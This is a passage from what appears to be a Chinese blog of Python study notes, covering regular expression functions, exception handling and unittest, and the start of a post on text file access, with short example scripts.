<td align="center">re.L</td>
<td align="center">使本地化识别（locale-aware）匹配</td>
</tr>
<tr>
<td align="center">re.M</td>
<td align="center">多行匹配，影响^和$</td>
</tr>
<tr>
<td align="center">re.S</td>
<td align="center">匹配包括换行在内的所有字符</td>
</tr>
<tr>
<td align="center">re.U</td>
<td align="center">根据Unicode字符集解析字符影响\w,\W,\b,\B</td>
</tr>
<tr>
<td align="center">re.X</td>
<td align="center">^匹配字符串和每行的行首，$匹配字符串和每行行尾</td>
</tr>
</tbody></table>
<p>可以使用匹配对象的函数：</p>
<ol>
<li><p>group(0):返回包含整个表达式的字符串</p>
</li>
<li><p>group(n1,n2,……)：返回一个包含多个组号对应值的元组</p>
</li>
<li><p>groups():返回一个包含所有小组字符串的元组</p>
</li>
<li><p>groupdict():返回一个包含所有经命名匹配小组的字典 </p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#使用re.match()匹配</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;0086-010-88668866&quot;</span><br>mat = re.match(<span class="hljs-string">r&quot;(?P&lt;nation&gt;\d&#123;4,&#125;)-(?P&lt;zone&gt;\d&#123;3,4&#125;)-(?P&lt;numper&gt;\d&#123;7,8&#125;)&quot;</span>,<span class="hljs-built_in">str</span>,re.M|re.I)<br><span class="hljs-keyword">if</span> mat:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mat.group(0)&quot;</span>,mat.group(<span class="hljs-number">0</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mat.group(1)&quot;</span>, mat.group(<span class="hljs-number">1</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mat.group(2)&quot;</span>, mat.group(<span class="hljs-number">2</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mat.group(3)&quot;</span>, mat.group(<span class="hljs-number">3</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mat.group(1,2,3)&quot;</span>, mat.group(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mat.groups()&quot;</span>, mat.groups())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mat.groupdict()&quot;</span>, mat.groupdict())<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;match匹配不成功！&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/25/python%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/6.jpg"></p>
</li>
</ol>
<p>2、res=re.search(pattern,str,flags=0):功能扫描整个字符串并返回第一个成功的匹配对象。用法和re.match()函数相同</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#使用re.search()查找</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;David的QQ电子邮箱：123456@qq.com&quot;</span><br>sea=re.search(<span class="hljs-string">r&quot;(?P&lt;user&gt;\d+)@(?P&lt;website&gt;\w+)\.(?P&lt;extension&gt;\w+)&quot;</span>,<span class="hljs-built_in">str</span>,re.M|re.I)<br><span class="hljs-keyword">if</span> sea:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sea.group(0):&quot;</span>,sea.group(<span class="hljs-number">0</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sea.group(1,2,3):&quot;</span>, sea.group(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sea.groups():&quot;</span>, sea.groups())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sea.groupdict():&quot;</span>, sea.groupdict())<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;search匹配不成功！&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/25/python%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/7.jpg"></p>
<h3 id="查找函数："><a href="#查找函数：" class="headerlink" title="查找函数："></a>查找函数：</h3><ol>
<li><p>res=re.findall(pattern,str,flags=0):功能使在字符串中找到正则表达式匹配的所有子字符串，并返回一个列表：如果没有找到匹配，则返回空列表。参数和re.match()函数相同</p>
<p><strong>注意：</strong>re.match()函数和re.search()函数就是返回一次匹配的结果，re.findall()返回所有匹配结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#使用re.findall函数</span><br><span class="hljs-keyword">import</span> re<br>res=re.findall(<span class="hljs-string">&#x27;\w+&#x27;</span>,<span class="hljs-string">&#x27;liv well,love lots,and laugh often&#x27;</span>)<span class="hljs-comment">#查找匹配字符串</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;匹配结果：&quot;</span>,res)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/25/python%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/8.jpg"></p>
</li>
<li><p>res=re.finditer(pattern,str,flags):功能是在字符串中找到正则表达式匹配的所有子字符串，并作为一个迭代器返回，参数和之前一样</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#re.finditer函数：</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;of the people,for the people,by the people&quot;</span><br>res=re.finditer(<span class="hljs-string">&quot;\w+ \w+ (people)&quot;</span>,<span class="hljs-built_in">str</span>)<br><span class="hljs-keyword">for</span> match <span class="hljs-keyword">in</span> res:<br>    <span class="hljs-built_in">print</span>(match.group())<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/25/python%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/9.jpg"></p>
</li>
</ol>
<h3 id="替换函数："><a href="#替换函数：" class="headerlink" title="替换函数："></a>替换函数：</h3><ol>
<li>res=re.sub(pattern,repl,str,[,count=0]):功能是将pattern的匹配项用repl替换，返回新字符串，pattern为正则表达式，repl为替换字符串，str为被查字符串，conunt为模式匹配最大次数，默认0为替换所有的匹配</li>
<li>res=re.subn(pattern,repl,str,[,count=-0]):功能将pattern匹配项用repl替换返回包含新字符串和替换次数的二元组，参数和上方一样</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#re.sub函数替换</span><br><span class="hljs-keyword">import</span> re<br>phoneNumber=<span class="hljs-string">&quot;400-669-5566#中国银行信用卡客服专线电话&quot;</span><br>num1=re.sub(<span class="hljs-string">&#x27;#.*$&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>,phoneNumber)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;使用sub（)替换结果：&quot;</span>,num1)<br>num2=re.subn(<span class="hljs-string">&quot;#.*$&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,phoneNumber)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;使用subn（）替换结果：&quot;</span>,num2)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/25/python%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/10.jpg"></p>
<h3 id="分割函数："><a href="#分割函数：" class="headerlink" title="分割函数："></a>分割函数：</h3><p>res=re.split(pattern,str,[,maxsplit=0,flags=0]):功能通过指定分隔符对字符串进行分隔并返回分隔结果列表，pattern为正则表达式，包含指定的分隔符，str为待分隔的字符串，maxsplit为分隔次数，默认为0，不限制次数，flags为可选标志位</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#re.split()分隔函数</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;多少事，从来急;天地转，光阴迫。一万年太久,只争朝夕.毛泽东&quot;</span><br>strlist=re.split(<span class="hljs-string">&#x27;\W+&#x27;</span>,<span class="hljs-built_in">str</span>)<br><span class="hljs-built_in">print</span>(strlist)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/25/python%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/11.jpg"></p>
<h3 id="编译函数："><a href="#编译函数：" class="headerlink" title="编译函数："></a>编译函数：</h3><p>re.compile(pattern,[,flags]):用于编译正则表达式，生成一个正则表达是对象，pattern为正则表达式，flags参考上面正则表达式常用标志位表格。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#re.compile(）编译函数</span><br><span class="hljs-keyword">import</span> re<br>pattern=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;wr\w+ \w+&#x27;</span>)<span class="hljs-comment">#生成正则表达式对象</span><br><span class="hljs-comment">#匹配字符串</span><br>res=pattern.findall(<span class="hljs-string">&quot;Frankly,in the opinion of Joint Chiefs of Staff,this strategy would involve us in the wrong war,at the wrong place,at the wrong time,and with the wrong enemy.&quot;</span>)<br><span class="hljs-keyword">if</span> res:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;匹配结果：&quot;</span>,res)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;匹配无结果！&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/25/python%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/11.jpg"></p>
<h2 id="常用的正则表达式："><a href="#常用的正则表达式：" class="headerlink" title="常用的正则表达式："></a>常用的正则表达式：</h2><img src="/2021/10/25/python%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/5.jpg" style="zoom:200%;">

            
        </article>
    </div>
    
    <div class="nexmoe-post">
        <a href="/2021/10/24/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%92%8C%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/">
            
                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;"> 
                    <img data-src="/assets/background.gif" data-sizes="auto" alt="python学习之异常处理和单元测试" class="lazyload">
                    <h1>python学习之异常处理和单元测试</h1>
                </div>
            
        </a>

        <div class="nexmoe-post-meta nexmoe-rainbow">
            <a><i class="nexmoefont icon-calendar-fill"></i>2021年10月24日</a>
            <a><i class="nexmoefont icon-areachart"></i>1.5k 字</a>
            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 6 分钟</a>
        </div>

        <article>
            
                <h1 id="异常类和异常处理"><a href="#异常类和异常处理" class="headerlink" title="异常类和异常处理"></a>异常类和异常处理</h1><h2 id="异常和异常类："><a href="#异常和异常类：" class="headerlink" title="异常和异常类："></a>异常和异常类：</h2><p>程序编译通过后，并不意味着运行就能获得正确结果，可能由于编程时考虑不周或运行时出现一些特殊情况（除数为零，越界，文件不存在等），结果出现中断程序正常运行，导致程序中断运行的错误称为异常（exception）又称例外。</p>
<p>异常是一个事件，该事件会在程序执行过程中发生，影响程序的正常执行，在python无法处理程序时就会产生异常，发生异常要捕获否则终止执行程序。</p>
<p><strong>常用异常类：</strong></p>
<p><img src="/2021/10/24/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%92%8C%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/1.jpg"></p>
<h2 id="异常处理："><a href="#异常处理：" class="headerlink" title="异常处理："></a>异常处理：</h2><h3 id="异常处理的格式："><a href="#异常处理的格式：" class="headerlink" title="异常处理的格式："></a>异常处理的格式：</h3><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>	语句块						<span class="hljs-comment">#包含可能发生的异常</span><br><span class="hljs-keyword">except</span> 异常类型 <span class="hljs-number">1</span> [ <span class="hljs-keyword">as</span> 错误描述]:<br>	语句块						<span class="hljs-comment">#异常处理语句块</span><br>	...<br><span class="hljs-keyword">except</span> 异常类型 <span class="hljs-number">2</span> [ <span class="hljs-keyword">as</span> 错误描述]:<br>	语句块						<span class="hljs-comment">#异常处理语句块</span><br><span class="hljs-keyword">except</span>:<br>	语句块						<span class="hljs-comment">#默认异常处理语句块</span><br>[<span class="hljs-keyword">else</span>:<br>	语句块]					<span class="hljs-comment">#没有异常时执行的语句</span><br>[<span class="hljs-keyword">finally</span>:<br>	语句块]					<span class="hljs-comment">#任何情况下都执行的语句块</span><br><br></code></pre></td></tr></table></figure>

<p>try子句：包含可能抛出异常的语句块</p>
<p>except子句：负责处理抛出的异常，处理的尝试顺序与多个except子句的编写顺序一致。当尝试发现第一个异常类型匹配的except子句时就执行其后的语句块。最后一个不指定异常类型的except子句匹配任何类型的异常。</p>
<p>else子句：当try子句中的语句块没有发生异常时执行，可选。</p>
<p>finally子句：无论是否抛出异常只要finally子句存在就会被最终执行。</p>
<p>try-except-else-finally语句的执行情况分为以下两种：</p>
<ol>
<li>try子句中的语句块没有发生异常，在执行完try子句中的语句块后，直接执行else子句块中语句块，最后执行finally子句中的语句块</li>
<li>try子句中的语句块发生异常，发生异常的类型将和except子句的异常类型进行匹配并执行其后的语句块，最后执行finally子句中的语句块。</li>
</ol>
<p>except子句else子句finally子句语句块可以为用户输出异常消息或提示信息，异常信息可以通过异常对象的message成员给出，也可以根据用户需求给出。</p>
<p>列表索引异常：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#try-except语句处理列表索引范围异常：</span><br>list1=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>]<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span>(list1[<span class="hljs-number">10</span>])<br><span class="hljs-keyword">except</span> IndexError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;列表索引超出范围&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/24/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%92%8C%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/8.jpg"></p>
<p>处理不确定异常：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#try-except处理不确定异常：</span><br>a=<span class="hljs-number">100</span><br><span class="hljs-keyword">try</span>:<br>    b=a+<span class="hljs-string">&quot;python&quot;</span><br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;异常类型：%s&quot;</span>%<span class="hljs-built_in">type</span>(e))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;异常信息：%s&quot;</span>%e)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/24/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%92%8C%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/9.jpg"></p>
<p>整除处理：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#整除处理：</span><br>x,y=<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入两个整数：&quot;</span>))<br><span class="hljs-keyword">try</span>:<br>    z=x/y<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;z=&quot;</span>,z)<br><span class="hljs-keyword">except</span> TypeError <span class="hljs-keyword">as</span> e1:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据类型异常：&quot;</span>,e1)<br><span class="hljs-keyword">except</span> ZeroDivisionError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;除数为零异常！&quot;</span>)<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;程序运行异常&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;程序正常执行！&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/24/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%92%8C%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/10.jpg"></p>
<p><img src="/2021/10/24/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%92%8C%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/11.jpg"></p>
<p><img src="/2021/10/24/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%92%8C%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/12.jpg"></p>
<p>处理文件访问异常：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#处理文件访问异常：</span><br><span class="hljs-keyword">try</span>:<br>    f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./1.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<span class="hljs-comment">#报错的化指定编码格式encoding=&#x27;utf=8&#x27;</span><br>    <span class="hljs-built_in">str</span>=f.read()<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;出现异常：%s&quot;</span>%e)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;执行成功！&quot;</span>)<br><span class="hljs-keyword">finally</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;执行完毕！&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2021/10/24/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%92%8C%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/13.jpg" alt="未指定编码格式" class="lazyload"></p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2021/10/24/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%92%8C%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/14.jpg" alt="指定了编码格式" class="lazyload"></p>
<h3 id="异常抛出："><a href="#异常抛出：" class="headerlink" title="异常抛出："></a>异常抛出：</h3><p>在except子句、else子句、finally子句的语句块中还可以将异常抛出，提供给调用它的上一级处理。抛出异常有raise语句执行。</p>
<p>格式：raise[Exception [,args [,traceback]]]  Exception为异常类型，args为用户提供的参数，可选。traceback跟踪异常对象，可选。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#抛出异常：</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">greaterZero</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">if</span> n&lt;<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;你传入了一个小于0的整数&quot;</span>) <span class="hljs-comment">#抛出异常</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n=&quot;</span>,n)<br><span class="hljs-keyword">try</span>:<br>    x=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入一个整数&quot;</span>))<br>    greaterZero(x)<span class="hljs-comment">#调用函数</span><br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/24/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%92%8C%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/6.jpg"></p>
<p><img src="/2021/10/24/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%92%8C%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/7.jpg"></p>
<h3 id="断言语句："><a href="#断言语句：" class="headerlink" title="断言语句："></a>断言语句：</h3><p>assert断言语句是一种在程序测试中比较常用的技术，常用于在程序的某个位置判断是否满足某个条件。assert语句格式：</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><code class="hljs tex">assert  expression[,atguments]<br></code></pre></td></tr></table></figure>

<p>其中express是结果为布尔值的表达式。arguments为参数，一般为错误提示信息，可选。assert断言语句的执行过程：如果expression的值为真，则程序忽略expression后面的参数，执行assert语句后面的语句；否则，assert语句触发异常。</p>
<p><img src="/2021/10/24/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%92%8C%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/5.jpg"></p>
<p>上述表达式为真不抛出异常，表达式为假抛出异常</p>
<p>在程序测试中未发现错误后，将python源程序编译为字节码文件时可以用优化参数-o或-oo将assert语言从程序语句中删除</p>
<h1 id="单元测试："><a href="#单元测试：" class="headerlink" title="单元测试："></a>单元测试：</h1><p>软件测试一般分为白盒测试和黑盒测试，对于业务比较复杂代码量大的软件白盒测试的难度较高，通常以黑盒测试为主，黑盒测试也称功能测试，通过测试来检测每一个功能能否正常使用。黑盒测试着眼于程序外部结构，不考虑内部逻辑结构，主要对软件界面和软件功能进行测试。单元测试是保证软件开发质量的基本方法，用于检验被测代码的一个很小的很明确的功能是否正确。一个单元测试判断某个特定函数的行为在各个情形下都符合要求，单元测试是最低级的测试活动。</p>
<p>python中用于进行单元测试的常用库是Unittest，其中最常用的是testcase类，其常用函数如下：</p>
<p><img src="/2021/10/24/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%92%8C%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/2.jpg"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#Unittest模块测试函数功能的正确性</span><br><span class="hljs-keyword">import</span> unittest<br><span class="hljs-comment">#定义测试类：</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestCaseOfArea</span>(<span class="hljs-params">unittest.TestCase</span>):</span><br>    <span class="hljs-comment">#定义测试方法，必须以test开头</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_are</span>(<span class="hljs-params">self</span>):</span><br>        area=getArea(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>)<br>        <span class="hljs-comment">#断言方法用来核实得到的结果是否与期望的结果一致</span><br>        self.assertEqual(area,<span class="hljs-number">12</span>,msg=<span class="hljs-string">&quot;测试未通过！&quot;</span>)<br><span class="hljs-comment">#定义求矩形面积函数：</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getArea</span>(<span class="hljs-params">x,y</span>):</span><br>    <span class="hljs-keyword">return</span> x*y<br><span class="hljs-comment">#执行测试</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    unittest.main()<br></code></pre></td></tr></table></figure>

<img src="/2021/10/24/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%92%8C%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/3.jpg" style="zoom: 80%;">

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2021/10/24/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%92%8C%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/4.jpg" alt="当计算结果和预测结果不同时" class="lazyload"></p>

            
        </article>
    </div>
    
    <div class="nexmoe-post">
        <a href="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/">
            
                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;"> 
                    <img data-src="/assets/background.gif" data-sizes="auto" alt="python学习之文件访问" class="lazyload">
                    <h1>python学习之文件访问</h1>
                </div>
            
        </a>

        <div class="nexmoe-post-meta nexmoe-rainbow">
            <a><i class="nexmoefont icon-calendar-fill"></i>2021年10月20日</a>
            <a><i class="nexmoefont icon-areachart"></i>2.8k 字</a>
            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 12 分钟</a>
        </div>

        <article>
            
                <h1 id="文件访问"><a href="#文件访问" class="headerlink" title="文件访问"></a>文件访问</h1><h2 id="文件的分类："><a href="#文件的分类：" class="headerlink" title="文件的分类："></a>文件的分类：</h2><ol>
<li>按文件内容分：<ul>
<li>程序文件:存储的是程序，包括源文件和可执行文件如：.py、.cpp、.exe等文件</li>
<li>数据文件:存储的是程序运行时所需的各种数据如：.txt、.docx、.xlsx等文件</li>
</ul>
</li>
<li>按信息存储形式分类：<ul>
<li>文本文件:基于字符编码的文件，常见编码方式:asscll、Unicode编码可以使用文本编辑软件进行修改，常见为:.txt、.html文件</li>
<li>二进制文件:存放各种数据的二进制编码，含有特殊的格式及计算机代码，必须用专用程序打开。常见的二进制编码文件有：数据库文件、图像文件、可执行文件、音频文件</li>
</ul>
</li>
</ol>
<h2 id="文本的访问："><a href="#文本的访问：" class="headerlink" title="文本的访问："></a>文本的访问：</h2><p><strong>访问步骤：</strong></p>
<ol>
<li>用open()函数打开一个文件，返回一个文件对象</li>
<li>调用文件对象中的函数对文件内容进行读或写等操作</li>
<li>调用文件对象的close()函数关闭文件</li>
</ol>
<h3 id="打开文件："><a href="#打开文件：" class="headerlink" title="打开文件："></a>打开文件：</h3><ol>
<li><p>open（）函数：python内置函数用于打开一个文件，返回一个文件对象，格式：open(filename[，mode])，filename为要打开文件的名称和路径，mode为文件访问的模式，如只读、写入、追加等，默认为只读(r).</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/1.jpg" alt="文件访问模式" class="lazyload"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">file=<span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;2.py&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;文件名：&quot;</span>,file.name)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;访问模式：&quot;</span>,file.mode)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;是否已关闭：&quot;</span>,file.closed)<br>file.closed<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/2.jpg"></p>
</li>
<li><p>with-as语句进行文本访问：在用open（）函数对文件打开或者进行读写扽操作的过程中都有可能发生错误，即使写了关闭文件的语句也不一定能正常执行，从而导致不能正常关闭文件，缓存信息可能会意外丢失，文件可能损坏，所以推荐使用with-as语句减少这种情况，它适用于对资源进行访问的场合，可确保不管在使用过程中是否发生异常都会执行清理操作，释放资源，文件使用后自动关闭</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#使用with-as访问文本文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./1.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:  <span class="hljs-comment">#注意要给权限</span><br>    num=file.write(<span class="hljs-string">&quot;Go its own way,let others say!&quot;</span>) <span class="hljs-comment">#向文件写入字符串</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;写入字符%d个！&quot;</span>%num)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/20/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/3.jpg"></p>
</li>
</ol>
<h3 id="文件操作："><a href="#文件操作：" class="headerlink" title="文件操作："></a>文件操作：</h3><ol>
<li><p>写文件：</p>
<ul>
<li><p>file.write(str字符串)和file.writelines(seuence字符序列)向文件中写内容</p>
